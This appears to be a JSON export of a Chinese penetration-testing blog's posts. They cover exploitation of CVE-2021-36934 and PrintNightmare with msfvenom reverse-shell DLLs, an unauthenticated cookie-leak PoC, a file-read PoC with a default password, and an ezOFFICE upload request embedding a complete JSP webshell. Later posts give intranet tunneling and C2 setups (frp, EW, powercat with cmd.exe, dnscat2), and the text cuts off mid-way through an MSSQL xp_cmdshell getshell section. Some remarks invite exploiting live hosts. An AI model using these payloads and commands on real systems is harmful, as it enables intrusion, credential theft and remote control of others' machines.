{"categories":[{"title":"SQL注入","uri":"https://ad-calcium.github.io/categories/sql%E6%B3%A8%E5%85%A5/"},{"title":"web安全","uri":"https://ad-calcium.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"title":"内网渗透","uri":"https://ad-calcium.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"title":"小技巧","uri":"https://ad-calcium.github.io/categories/%E5%B0%8F%E6%8A%80%E5%B7%A7/"},{"title":"未授权漏洞","uri":"https://ad-calcium.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"},{"title":"漏洞复现","uri":"https://ad-calcium.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"posts":[{"content":"0x01 漏洞介绍 某信xxx设备管理系统存在弱口令漏洞并存在任意文件读取漏洞，攻击者可利用该漏洞获取服务器上的铭感文件。\n0x02 漏洞复现 fofa上看了一波，还是有很多资产的\n弱口令：guest/guest*PWD\nPOC:https://xxxxxxx/view/action/download_file.php?filename=/root/.bash_history\u0026amp;savename=\r ","id":0,"section":"posts","summary":"0x01 漏洞介绍 某信xxx设备管理系统存在弱口令漏洞并存在任意文件读取漏洞，攻击者可利用该漏洞获取服务器上的铭感文件。 0x02 漏洞复现 fofa上看了一波","tags":["漏洞复现","web渗透"],"title":"某信xxx设备存在任意文件读取漏洞","uri":"https://ad-calcium.github.io/2021/07/%E6%9F%90%E4%BF%A1xxx%E8%AE%BE%E5%A4%87%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","year":"2021"},{"content":"0x01 漏洞介绍 Windows 10 中允许以非管理员用户身份检索所有注册表配置单元。例如，这包括 SAM 中的哈希值，可用于以 SYSTEM 身份执行代码\n0x02 漏洞利用前提 适用于所有受支持的 Windows 10 版本，其中启用了系统保护（在大多数配置中应默认启用）。\n0x03 工具 提权工具：https://github.com/GossiTheDog/HiveNightmare\n横向移动工具：https://github.com/SecureAuthCorp/impacket\nmimikatz：https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210721/mimikatz_trunk.7z\n0x04 漏洞复现 一、检查是否易受攻击 icacls C:\\windows\\system32\\config\\sam\r 如果输出 BUILTIN\\Users:(I)(RX) 表示该系统易受攻击。\n如果输出 Access is denied 或拒绝访问表示该系统不易受攻击。\n二、通过HiveNightmare.exe导出sam hash进行提权 1.查看当前用户 运行exp，运行完成后会在桌面上生成三个文件\n查看转存下的文件\n2.解密凭证 将文件放到本地使用secretsdump.py进行解密，成功获取主机的hash\npython3 secretsdump.py -sam SAM-haxx -system SYSTEM-haxx -security SECURITY-haxx LOCAL\r 3.解密nthash 使用CMD5网站将nthash进行解密，成功获取明文密码\nhttps://www.cmd5.com/\n4.横向移动 使用获取的hash进行横向移动\npsexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 administrator@10.108.3.77\r psexec乱码解决办法chcp 65001\n三、通过mimkiatz导出sam hash进行提权 1.查看用户属性 普通账号下运行mimikatz并执行查看所有用户的属性\n2.导出shadowcopy volume mimikatz # misc::shadowcopies  3.读取密码 mimikatz# lsadump::sam /system:\\\\?\\GLOBALROOT\\Device\\HarddiskvolumeShadowcopy2\\widows\\system2\\config\\SYSTEM /sam:\\\\?\\GLOBALROOT\\Device\\HarddiskvolumeShadowcopy2\\windows\\system32\\config\\SAM\r 附录 如果提示以下错误，可能是未开启系统保护（在大多数配置中应默认启用）\n开启系统保护的方法 1.点击配置\n2.点击配置，选择\u0026quot;启用系统保护\u0026quot;\n3.点击\u0026quot;创建\u0026quot;\n4.输入还原点的描述(随便输入即可)\n5.等待创建完成\n提示成功创建\n","id":1,"section":"posts","summary":"0x01 漏洞介绍 Windows 10 中允许以非管理员用户身份检索所有注册表配置单元。例如，这包括 SAM 中的哈希值，可用于以 SYSTEM 身份执行代码 0x02 漏洞利用前提 适用于所有受支持","tags":["漏洞复现","内网"],"title":"CVE-2021-36934 漏洞复现","uri":"https://ad-calcium.github.io/2021/07/cve-2021-36934%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","year":"2021"},{"content":"0x01 漏洞描述 jdc用于对接青龙面板 2.0使用，用于自助扫码功能，由于开发者未对checkcookie进行鉴权，导致攻击者通过该漏洞获取全部cookie，造成用户信息泄露等。\n0x02 漏洞复现 poc：http://IP:5678/checkcookie\r 获取到jd的cookie，怎么用大家都懂。\n撸了个脚本,跑了一下大概还有几十个漏洞，懂得小伙伴可以去梭哈一波。\n","id":2,"section":"posts","summary":"0x01 漏洞描述 jdc用于对接青龙面板 2.0使用，用于自助扫码功能，由于开发者未对checkcookie进行鉴权，导致攻击者通过该漏洞获取全部co","tags":["漏洞复现","web安全"],"title":"jdc未授权访问","uri":"https://ad-calcium.github.io/2021/07/jdc%E6%9C%AA%E6%8E%88%E6%9D%83/","year":"2021"},{"content":"复现环境 靶机：Windows Server 2019\n攻击机：kali\n漏洞介绍 Windows Print Spooler是Windows的打印机后台处理程序，广泛的应用于各种内网中，攻击者可以通过该漏洞绕过PfcAddPrinterDriver的安全验证，并在打印服务器中安装恶意的驱动程序。若攻击者所控制的用户在域中，则攻击者可以连接到DC中的Spooler服务，并利用该漏洞在DC中安装恶意的驱动程序，完整的控制整个域环境。\n该漏洞广泛的存在于各Windows版本中，利用复杂度为中，但由于成功利用该漏洞的攻击者可以完整的控制域环境，造成非常严重的后果，所以该漏洞的利用价值极高。\n影响版本 Windows Server 2016\nWindows Server 2019\n利用前提 1.靶机没有更新CVE-2021-1675的补丁\n2.域内任意账户的用户名密码\n3.域控ip\n4.可被域控匿名访问的共享文件夹\n漏洞工具 CVE-2021-1675(域提权)：https://github.com/cube0x0/CVE-2021-1675\nCVE-2021-1675本地提权：https://github.com/gyaansastra/Print-Nightmare-LPE\n漏洞复现 一、域提权 1.配置smb服务 下面为配置文件/etc/samba/smb.conf需要修改的地方。\n[global]\rmap to guest = Bad User\rserver role = standalone server\rusershare allow guests = yes\ridmap config * : backend = tdb\rsmb ports = 445\rlog level = 10\r[share]\rcomment = share\rpath = /tmp\rguest ok = yes\rwritable =yes\rbrowsable = yes\r#force user = smbuser\r 启动smb服务\nservice smbd start\r 2.探测是否存在漏洞 使用impacket工具包中的rpcdump.py判断目标及其是否存在漏洞\nrpcdump.py @10.99.99.250 | grep MS-RPRN\r 3.使用msf生成恶意dll msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.99.99.175 LPORT=9999 -f dll -o /tmp/test.dll\r注意：只能使用64位的dll文件，否则会发现，dll可以上传但不会被执行\r 4.开启msf监听 使用msf监听，首先输入msfconsole\n输入以下内容监听\nuse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 10.99.99.175\rset lport 9999\rrun\r 5.漏洞利用 进入exp目录\ncd /root/CVE-2021-1675-main\r 漏洞利用\n其中cyberpeace为域的名字，admin:qq123456..分别是域控任意用户的账号密码，10.99.99.250是域控ip。 后面的\\\\10.99.99.175\\share\\test.dll为smb可访问的unc路径，也是共享文件的路径。\npython3 CVE-2021-1675.py cyberpeace/admin:qq123456..@10.99.99.250 \u0026quot;\\\\\\10.99.99.175\\share\\test.dll\u0026quot;\r 成功获取域控权限\n查看当前主机权限和主机信息\ngetuid #查看当前权限\rsysinfo #查看主机信息\r 二、本地提权 1.新增用户 默认添加一个新用户到本地管理员组：\npowershell\rImport-Module .\\cve-2021-1675.ps1 #导入模块\rInvoke-Nightmare -newuser \u0026quot;test\u0026quot; -newpassword \u0026quot;test\u0026quot; -drivername \u0026quot;printme\u0026quot; #新建用户，用户名：test 密码：test\r 验证攻击是否成功\n2.自定义dll文件 msf生成dll文件\nmsfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.3.54 lport=4444 -f dll \u0026gt; x.dll\r 监听主机\nuse exploit/multi/handler set payload windows/x64/meterpreter/reverse_tcp set LHOST 192.168.93.40 set lport 4444 exploit\n加载dll文件\nImport-Module .\\cve-2021-1675.ps1\rInvoke-Nightmare -DLL \u0026quot;C:\\Users\\Administrator\\Downloads\\x.dll\u0026quot;\r 主机成功上线\n","id":3,"section":"posts","summary":"复现环境 靶机：Windows Server 2019 攻击机：kali 漏洞介绍 Windows Print Spooler是Windows的打印机后台处理程序，广泛的应用于各种内网中，攻击","tags":["漏洞复现","内网"],"title":"CVE-2021-1675 漏洞复现","uri":"https://ad-calcium.github.io/2021/07/cve-2021-1675%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","year":"2021"},{"content":"0x01 漏洞描述 万户Ezoffice系统是一套基于jsp的oa系统，该系统基于J2EE架构技术的三层架构，完全采用B/S体系结构，广泛应用于各个行业。 ezOFFICE协同管理平台存在文件上传漏洞，攻击者可利用该漏洞获取服务器权限。\n0x02 fofa语法 body=\u0026quot;ezOFFICE\u0026quot;\r 0x03 漏洞复现 上传成功返回文件名，拼接一下即可\n完整的url：http://www.baidu.com/defaultroot/upload/html/xxx.jsp，上传之后使用冰蝎连接，默认密码为:rebeyond\n数据包\nPOST /defaultroot/upload/fileUpload.controller HTTP/1.1\rHost: www.baidu.com\rUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0\rAccept-Encoding: gzip, deflate\rAccept: */*\rConnection: close\rContent-Type: multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\rContent-Length: 773\r--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\rContent-Disposition: form-data; name=\u0026quot;file\u0026quot;; filename=\u0026quot;xxxxx.jsp\u0026quot;\rContent-Type: application/octet-stream\rContent-Transfer-Encoding: binary\r\u0026lt;%@page import=\u0026quot;java.util.*,javax.crypto.*,javax.crypto.spec.*\u0026quot;%\u0026gt;\u0026lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%\u0026gt;\u0026lt;%if (request.getMethod().equals(\u0026quot;POST\u0026quot;)){String k=\u0026quot;e45e329feb5d925b\u0026quot;;/*......tas9er*/session.putValue(\u0026quot;u\u0026quot;,k);Cipher c=Cipher.getInstance(\u0026quot;AES\u0026quot;);c.init(2,new SecretKeySpec(k.getBytes(),\u0026quot;AES\u0026quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%\u0026gt;\r--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--\r ps:最近这几天被上传了好几十个shell，哥哥们太猛了\n","id":4,"section":"posts","summary":"0x01 漏洞描述 万户Ezoffice系统是一套基于jsp的oa系统，该系统基于J2EE架构技术的三层架构，完全采用B/S体系结构，广泛应用于各个行","tags":["漏洞复现","web安全"],"title":"ezOFFICE 任意文件上传","uri":"https://ad-calcium.github.io/2021/07/ezoffice%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","year":"2021"},{"content":"0x00 内网穿透技术 当我们拿到一台内网主机后，一般都是有区域隔离的。所以这时候就用到流量代理了。这里简单介绍一下建立通信隧道，常见的有端口转发等\n主要隧道有：\nICMP TCP UDP SSH HTTP DNS SOCKS\r 0x01 首先判断出网协议 icmp协议：\nping www.baidu.com\r TCP协议：\ncurl www.baidu.com\rnc IP\r HTTP协议：\ncurl ip:port\rcurl www.baidu.com:80\r DNS协议：\nNslookup www.baidu.com\rDig www.baidu.com\r 理论知识 正向代理 正向代理类似一个跳板机，代理访问外部资源（比如我们国内访问谷歌，直接访问访问不到，我们可以通过一个正向代理服务器，请求发到代理服，代理服务器能够访问谷歌，这样由代理去谷歌取到返回数据，再返回给我们，这样我们就能访问谷歌了）\r 反向代理 反向代理（Reverse Proxy）实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器\r 常用工具： proxifier: https://www.proxifier.com/\rfrp: https://github.com/fatedier/frp\rhttps://github.com/ehang-io/nps\rhttps://github.com/L-codes/Neo-reGeorg\rproxifier注册码\r用户名：zxhi\r注册码：LYZGL-F2KX3-JW5W4-A33MC-25QHH\r FRP 一、正向代理 1.在客户端配置 [common]\rbind_addr = 0.0.0.0\rbind_port = 7000\rtoken = 123456\r 配置好之后运行frps.exe -c frps.ini\n2.在vps中配置 frpc.ini\n[common]\r# 填写客户端的\rserver_addr = 10.108.3.58\rserver_port = 7000\rtoken = 123456\r[plugin_http_proxy]\rtype = tcp\rremote_port = 7890\rplugin = http_proxy\r# 可以添加认证\r# plugin_http_user = abc\r# plugin_http_passwd = abc\r[plugin_socks5]\rtype = tcp\rremote_port = 7891\rplugin = socks5\r# plugin_user = abc\r# plugin_passwd = abc\r 配置好之后运行frpc.exe -c frpc.ini\n二、反向代理 目的：\n1.需要通过公网服务器代理连接内网机器\r2.需要通过代理使得本机外网地址变为该内网机器外网IP\r 拓扑图\n1、首先在公网上配置服务端(frps.ini) #frps.ini\n[common]\rbind_addr = 0.0.0.0\rbind_port = 7000\rtoken = 123456\r 配置好之后运行frps.exe -c frps.ini\n2、配置客户端frpc. ini #frpc.ini\n[common]\r# 填写攻击机的地址\rserver_addr = 10.108.3.58\rserver_port = 7000\rtoken = 123456\r[plugin_http_proxy]\rtype = tcp\rremote_port = 7890\rplugin = http_proxy\r# 可以添加认证\r# plugin_http_user = abc\r# plugin_http_passwd = abc\r[plugin_socks5]\rtype = tcp\rremote_port = 7891\rplugin = socks5\r# plugin_user = abc\r# plugin_passwd = abc\r 配置好之后运行frpc.exe -c frpc.ini\n3、配置proxifier 配置ip、端口、连接方式、账号密码\n配置通过该代理的IP Target hosts处添加允许通过的IP（一般内网我都会只让内网的IP通过，防止流量过大）\n尝试访问内网地址\n三多层socks代理 实验环境：内网C主机不能直接连接vps，可以连接内网B主机，B主机可以直接连接vps，所以通过B作为跳板，将socks代理建设在内网C主机中\n具体思路：利用B即作为服务端(frps)，也同时作为客户端(frpc)\n1、VPS配置 #frps.ini\n[common]\rbind_addr = 0.0.0.0\rbind_port = 7000\rtoken = 123456\r 配置好之后运行\nfrps.exe -c frps.ini\r 2、内网B主机的frpc.ini设置： #frpc.ini\n[common]\r# 填写自己的服务器IP\rserver_addr = 10.108.3.58\rserver_port = 7000\rtoken = 123456\r[plugin_http_proxy]\rtype = tcp\rremote_port = 7890\rplugin = http_proxy\r#添加认证\r#plugin_http_user = abc\r#plugin_http_passwd = abc\r[plugin_socks5]\rtype = tcp\rremote_port = 7891\rplugin = socks5\rplugin_user = abc\rplugin_passwd = abc\r 配置好之后运行\nfrpc.exe -c frpc.ini\r 3、内网B主机的frps.ini设置： [common]\r# 填写攻击机的地址\rserver_addr = 192.168.1.50\rserver_port = 7000\rtoken = 123456\r 4、内网C主机的frpc.ini设置 frpc.ini\n[common]\r#填写跳板的地址，这里填写的是主机B的IP地址\rserver_addr = 192.168.1.50\rserver_port = 7000\rtoken = 123456\r[plugin_socks5]\rtype = tcp\rremote_port = 7891\rplugin = socks5\r 配置好之后运行\nfrpc.exe -c frpc.ini\r 思路分析：\n两个启动以后，其实已经可以直接通过使用B主机ip+端口直接使用搭建在C主机的socks代理，但是此时是无法直接访问B主机的，但是B主机出网，所以可以通过将刚刚C连接B的7891端口映射到vps上，通过连接vps+端口使用C主机的socks代理\n5、测试socks代理是否搭建成功： 访问主机B的web服务(192.168.1.50)\n访问主机C的web服务(192.168.2.200)\n说明代理没问题\nEW 一、反向代理 攻击机：\new -s rcsocks -l 1081 -e 1080\r将靶机中的1080端口流量代理到本地的1081端口上\r 靶机\new -s rssocks -d 攻击机IP -e 1080\r 二、多层代理 获得目标网络内两台主机 A、B 的权限，情况描述如下：\rA 主机： 目标网络的边界主机，无公网 IP，无法访问特定资源。\rB 主机： 目标网络内部主机，可访问特定资源，却无法回连公网。\rA 主机可直连 B 主机\r一台可控公网IP主机 可控内网主机A 内网主机C\r+---------+ +--------------------------+ | +------------------------+ +-----------------------------+\r|HackTools| -\u0026gt;\u0026gt; | 9999 -\u0026gt; 10.108.3.58 -\u0026gt; 8888 | 防火墙 | \u0026lt;-- 192.168.1.50 --\u0026gt; | -\u0026gt;\u0026gt; | 9999 --\u0026gt; 192.168.2.200 |\r+---------+ +--------------------------+ | +------------------------+ +-----------------------------+\r 在VPS( 10.108.3.58 )公网主机添加转接隧道，将 9999收到的代理请求，转交给反连 8888 端口的主机\new -s lcx_listen -l 9999 -e 8888\r 在内网主机A(192.168.2.200)上利用 ssocksd 方式启动 7777端口的 socks 代理\new -s ssocksd -l 777\r 在 192.168.1.50 上，通过工具的 lcx_slave 方式，打通10.108.3.58:9999 和 192.168.2.200:7777之间的通讯隧道\new -s lcx_slave -d 10.108.3.58 -e 8888 -f 192.168.1.200 -g 7777\r 验证\nlcx端口转发 windows\rvps: lcx -listen 2222 3333 //2222为转发端口，3333为本机任意未被占用的端口\r肉鸡：lcx -slave vps_ip 2222 127.0.0.1 3389 //将本地3389端口转发至vps_ip 2222端口\r3389连接时格式 vps:3333\rlinux\rvps：./portmap -m 2 -p1 6666 -h2 公网IP -p2 7777\r肉鸡：./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网ip -p2 6666\r将内网主机22端口的流量转发到公网主机的6666端口\r nps NPS工具是一款使用go语言编写的轻量级、功能强大的内网穿透工具。支持TCP、UDP流量转发，支持内网HTTP、SOCKS5代理，同时支持snappy压缩(节省带宽和流量)、站点保护、加密传输、多路复用、header修改等。同时还支持web图形化管理。该工具使用简单，相比于FRP，NPS是图形化界面，因此配置更加简单。\n待写\nneo-reGeorg VPS上支持生成的服务端，默认 GET 请求响应指定的页面内容 (如伪装的404页面)\npython neoreg.py generate -k \u0026lt;you_password\u0026gt; --file 404.html\r 将相应的隧道文件放到目标服务器的web目录后使用neoreg连接web服务器并建立本地socks代理。\nVPS上运行\npython neoreg.py -k \u0026lt;you_password\u0026gt; -u \u0026lt;server_url\u0026gt; --proxy socks5://10.1.1.1:8080（本地代理地址）\r Socks连接工具连接本地127.0.0.1:1080\nPowercat（powershell版的nc） 正向和反向连接：\rpowercat -l -p 8080 -e cmd.exe -v nc 192.168.1.1 8080 -vv\rnc -l -p 8080 -vv\rpowercat -c 192.169.1.1 -p 8080 -e cmd.exe -v\r 应用层 SSH转发： 一个正常的SSH命令\n ssh root@192.168.1.1\r SSH 本地转发机制： 拓扑：\nVPS\u0026mdash;-边界WEB\u0026mdash;-目标主机\n边界WEB双网卡192.168.1.1和10.1.1.1段\n本地转发机制：\n选项：\n-C 压缩传输\r-f 后台启用\r-N 不打开远程shell，处于等待状态\r-g 允许本地转发端口\r 使用方法：\n在VPS上运行\n用法：ssh -CfNg -L \u0026lt;vps port\u0026gt;:\u0026lt;目标主机 host\u0026gt;:\u0026lt;目标主机 port\u0026gt; \u0026lt;SSH 边界机\u0026gt;\rssh -CfNg -l 5555:10.1.1.1:3389 root@192.168.1.1\r#VPS检查---查看端口是否已经连接\rnetstat -tulnp | grep \u0026quot;5555\u0026quot;\r 当访问 VPS 5555 端口的时候，就转发给 root@192.168.1.1 边界机 ，发送给目标主机\nSSH 远程转发机制： 拓扑：\nVPS\u0026mdash;-边界WEB\u0026mdash;-目标主机\n边界WEB\u0026mdash;-目标主机\u0026mdash;都是单网卡，都是纯内网 10.1.1.1段\n在WEB边界机运行\nssh -CfNg -R \u0026lt;vps port\u0026gt;:\u0026lt;目标主机 host\u0026gt;:\u0026lt;目标主机 port\u0026gt; \u0026lt;SSH VPS主机\u0026gt;\rssh -CfNg -l 6666:10.1.1.1:3389 root@49.121.1.102\r 边界机把内网的端口，远程连接道VPS，远程转发道VPS\nSSH 动态转发机制： 这里主要是建立一个动态的socks代理隧道\n在VPS上运行\nssh -CfNg -D 7000 \u0026lt;SSH 边界主机\u0026gt;\rssh -CfNg -D 7000 root@192.168.1.1\r VPS上7000端口上，开了一个socks代理，用代理软件就可以连接\nDNS 隧道： dnscat2\n工具dnscat2，这是一DNS隧道，该工具旨在通过DNS协议创建加密的命令和控制（C＆C）通道，还有自己的控制台\ndnscat2分为两个部分：客户端和服务器。\n服务端为Ruby编写，需安装Ruby环境。kali系统内置Ruby，但是运行时仍可能报缺少一些gem依赖：\n服务端VPS：\n安装依赖：\rapt install gem\rapt install ruby-dev\rapt install libpq-dev\rapt install ruby-bundler\r下载并安装：\rgit clone https://github.com/iagox86/dnscat2.git\rcd dnscat2/server\rsudo gem install bundler\r开启服务：\rruby ./dnscat2.rb vpn.zeo.com -e open\r 目标主机客户端：\n上传dnsClient.zip 到目标主机 解压\n./dnscat --dns server=服务端ip,port=53 --secret=服务端生成的秘钥\r 直连模式使用方法：\nVPS中 server路径下：\rruby ./dnscat2\r客户端：（这个命令会在 上面服务启动后提示，可以参考下面的截图红框）\r./dnscat --dns server=x.x.x.x,port=53 --secret=281fc7a7ec57d500d269c96b8ae36ba5\r 参考：\nhttps://buaq.net/go-26843.html\n","id":5,"section":"posts","summary":"0x00 内网穿透技术 当我们拿到一台内网主机后，一般都是有区域隔离的。所以这时候就用到流量代理了。这里简单介绍一下建立通信隧道，常见的有端口转发等 主","tags":["流量代理","内网渗透"],"title":"内网穿透工具的使用","uri":"https://ad-calcium.github.io/2021/07/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/","year":"2021"},{"content":"一、MSSQL简介 MSSQL(MicroSoft SQL Server数据库)，是微软开发的关系型数据库管理系统DBMS，是一个较大型的数据库，提供数据库的从服务器到终端的完整的解决方案，数据库管理系统SSMS(SQL Server Managerment Studio)，是一个用于建立、使用和维护数据库的集成开发环境。 端口号：1433\nSA用户 在搭建时，选择使用SQL Server身份验证会创建SA账户并设置密码，SA(System Administrator)表示系统管理员，在SQLServer2019之前的SA用户都是系统最高权限用户SYSTEM，但在2019版本时为普通数据库用户mssqlserver，是一个低权用户。\n系统库 系统数据库默认创建时就会存在，有以下4种\n存储过程 存储过程是一个可编程的函数，它在数据库中创建并保存，是存储在服务器中的一组预编译过的T-SQL（SQL语言版本之一，只能在SQLserver使用）语句。数据库中的存储过程可以看做是对编程中面向对象方法的模拟。它允许控制数据的访问方式（可以将存储过程理解为函数调用的过程），使用execute命令执行存储过程。\n系统存储过程、扩展存储过程、用户自定义的存储过程。\n 系统存储过程主要存储在master数据库中，以\u0026quot;sp_\u0026ldquo;为前缀，在任何数据库中都可以调用，在调用的时候不必在存储过程前加上数据库名； 扩展存储过程则是对动态链接库(DLL)函数的调用，主要是用于客户端与服务器端或客户端之间进行通信的，以“xp_\u0026ldquo;为前缀，使用方法与系统存储过程类似； 用户定义的存储过程是SQLServer的使用者编写的存储过程；  存储过程为数据库提供了强大的功能，但在相应的权限下，攻击者可以利用不同的存储过程执行不同的高级功能，如：创建数据库用户、枚举文件目录、执行任意系统命令等。正因如此，SQLserver2005、2008等之后的版本分别对存储过程做了权限控制，以防滥用。\nServer权限体系 权限两个字，一个权力，一个限制。在软件领域通俗的解释就是哪些人可以对哪些资源做哪些操作。在SQL Server中，”哪些人”，“哪些资源”,”哪些操作”则分别对应SQL Server中的三个对象，分别为主体(Principals),安全对象(Securables)和权限(Permissions)，而权力和限制则是对应了SQL Server中的GRENT和DENY。对于主体，安全对象和权限的初步理解，见下图：\n主体 “主体”是可以请求 SQL Server 资源的实体。主体可以是个体，组或者进程。主体可以按照作用范围被分为三类:\n Windows级别主体：包括Windows 域登录名和Windows 本地登录名。 服务器级别主体：包括服务器登录名和服务器角色。 数据库级别主体：包括数据库用户、数据库角色、固定数据库角色以及应用程序角色。  可以看到主体包括登录名以及角色。\n角色 角色可以看成是权限的集合体，为了方便权限管理，可以把一些常用权限赋予角色，然后再把角色赋予相关用户，则这些用户就继承了橘色中的所有权限。一般情况下，数据库会内置一些角色，用户也可以创建自定义角色。对角色进行权限管理的方式与对用户进行权限管理的方式是相同的。 角色在SQL Server中被分为三类，分别为:\n 内置角色\u0026mdash;-这类角色在服务器安装时已经默认存在，其权限是固定的，并且不能被删除 用户自定义角色\u0026mdash;-这类角色由用户按照需求自定义创建 应用程序角色\u0026mdash;-这类特殊角色用于管理应用程序的数据访问  角色也分为两个方面：\n 服务器级别的角色，用于数据库服务器方面的控制权限 数据库级别的角色，用于数据库中数据的控制权限。  1.服务器级别的角色 服务器级角色的权限作用域为服务器范围。例如创建、修改、删除数据库，管理磁盘文件，添加或删除数据库连接等等，都是需要服务器上的权限才能进行操作。 固定服务器角色具有一组固定的权限，并且适用于整个服务器范围。 它们专门用于管理 SQL Server，且不能更改分配给它们的权限。 可以在数据库中不存在用户帐户的情况下向固定服务器角色分配登录。 **服务器级别的对象，只能包含登录名。**定义了服务器角色，你定义的登陆用户就有了相应的执行权限。先来看一下服务器级别的固定角色：\n   服务器角色 含义     sysadmin 可以在服务器上执行任何活动   serveradmin 可以更改服务器范围的配置选项和关闭服务器   securityadmin 管理和审核登录用户。具有 GRANT、DENY 和 REVOKE 服务器和数据库级别的权限。此外，还可以重置 SQL Server 登录名的密码   processadmin 管理SQL Server运行的进程   setupadmin 可以使用 T-SQL 语句添加和删除连接服务器，并可以执行某些系统存储过程（如 sp_serveroption）   bulkadmin 可以运行 BULK INSERT 语句   diskadmin 用于管理磁盘文件   dbcreator 可以创建、更改、删除和还原任何数据库   public public角色不同于其它角色在于其权限可以被修改，每个 SQL Server 登录名都属于 public 服务器角色。无法将用户、角色或组指派给它，因为默认情况下它属于该角色，且public不能被删除    2.数据库级别的角色 数据库级角色的权限作用域为数据库范围。例如可以访问哪个数据库，可以访问哪个数据库中的哪些数据表、哪些视图、哪些存储过程等等，都需要数据库上的权限才能进行操作。 SQL Server存在两种类型的数据库级角色：数据库中预定义的“固定数据库角色”和可以创建的“用户定义的数据库角色”。 固定数据库角色是SQL Server预定义的数据库角色，具有数据库级别的管理权限，并且存在于每个数据库中。**db_owner *数据库角色的成员可以管理固定数据库角色成员身份。自定义数据库角色是当固定数据库角色不能满足要求时，可以自定义数据库角色。 * 数据库级别的对象，只能包含数据库用户名。**先来看一下数据库级别的固定角色：\n   数据库角色 含义     db_owner 可以执行数据库中技术所有动作的用户，执行所有的配置活动和维护活动   db_securityadmin 管理数据库安全，可以修改角色成员身份和管理权限。向此角色中添加主体可能会导致意外的权限升级   db_accessadmin 可以为 Windows 登录名、Windows 组和 SQL Server 登录名添加或删除数据库访问权限   db_backupoperator 可以备份数据库   db_ddladmin 可以在数据库中运行任何数据定义语言 (DDL) 命令   db_datawriter 可以在所有用户表中添加、删除或更改数据   db_datareader 可以从所有用户表中读取所有数据   db_denydatawriter 不能添加、修改或删除数据库内用户表中的任何数据   db_denydatareader 不能读取数据库内用户表中的任何数据   public public角色不同于其它角色在于其权限可以被修改，每个数据库用户、角色或组都属于public数据库角色。无法将用户、角色或组指派给它，因为默认情况下它属于该角色，且public不能被删除    登录账号和数据库用户 SQL Server的服务器和数据库是两个层次的概念，SQL Server的用户也分为两种，一种是服务器登陆账号，另一种是数据库用户。 一个人要操作SQL Server数据库，首先要为其创建服务器登陆账号，使得他可以登录到服务器上，然后还要在要操作的数据库上创建和这个登陆账号对应的数据库用户。 可以给登陆账号赋予相应权限，使得这个账号可以执行指定的管理服务器的任务。也可以给数据库用户赋予相应权限，使得这个数据库用户可以在这个数据库中执行指定的操作。 服务器登陆账号分为为Windows验证及SQL Server验证两种。\n Windows身份验证模式：把Windows的操作系统用户添加为SQL Server服务器登陆账号，SQL Server并不参与验证。SQL Server完全相信Windows的验证结果，所以用此方式登录SQL Server时并不需要提供密码。 SQL Server和Windows身份验证模式：这种模式即允许由Windows来验证主体身份，又允许SQL Server来验证主体身份，当由SQL Server验证主体身份时，需要用户名和密码来确认主体身份，和使用什么Windows账户半毛钱关系都没有，是在服务器上创建的另外一种独立账号。  getshell 能否getshell要看你当前的用户权限，如果是没有进行降权的sa用户，那么你几乎可以做任何事。当然你如果有其他具有do_owner权限的用户也可以。\n拿shell的两大前提就是\n 有相应的权限db_owner 知道web目录的绝对路径  我们先来了解下怎么去寻找web目录的绝对路径。\n寻找绝对路径  报错信息 字典猜 旁站的目录 存储过程来搜索 读配置文件  前三种方法都是比较常见的方法。我们主要来讲第四种调用存储过程来搜索。\n先来看xp_dirtree直接举例子\nexecute master..xp_dirtree 'c:' --列出所有c:\\文件、目录、子目录 execute master..xp_dirtree 'c:',1 --只列c:\\目录\rexecute master..xp_dirtree 'c:',1,1 --列c:\\目录、文件\r 当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中，这样只需要去读取tmp表中的数据即可\nCREATE TABLE tmp (dir varchar(8000),num int,num1 int);\rinsert into tmp(dir,num,num1) execute master..xp_dirtree 'C:\\Users\\Administrator\\Desktop',1,1;\r 测试完成后记得删除tmp表\ndrop table tmp\r 我们再来看xp_cmdshell怎么去找绝对路径，实际上原理就是调用cmd来查找文件（如果可以执行命令，可以通过远程下载文件的方式下载木马）\nhttp://127.0.0.1/1.aspx?id=1;CREATE TABLE cmdtmp (dir varchar(8000));\rhttp://127.0.0.1/1.aspx?id=1;insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\\ %i in (1*.aspx) do @echo %i'\r xp_cmdshell拿shell xp_cmdshell这个存储过程可以用来执行cmd命令，那么我们可以通过cmd的echo命令来写入shell，当然前提是你知道web目录的绝对路径\nhttp://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell 'echo ^\u0026lt;%@ Page 